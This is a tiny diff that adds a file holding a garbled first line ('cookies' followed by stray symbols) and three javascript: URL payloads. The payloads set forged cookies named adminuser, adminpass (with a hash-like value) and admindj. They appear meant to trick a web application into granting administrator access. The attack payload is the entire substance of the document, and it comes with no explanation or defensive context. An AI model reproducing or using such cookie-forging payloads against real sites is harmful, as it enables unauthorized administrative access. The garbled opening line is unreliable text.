@@ -1,0 +1,4 @@
+cookies∆€∆≠°£
+
+javascript:alert(document.cookie="adminuser="+escape("admin")); javascript:alert(document.cookie="adminpass="+escape("de3622b4d3e370540aeccc83f62ef855")); javascript:alert(document.cookie="admindj="+escape("1"));
+
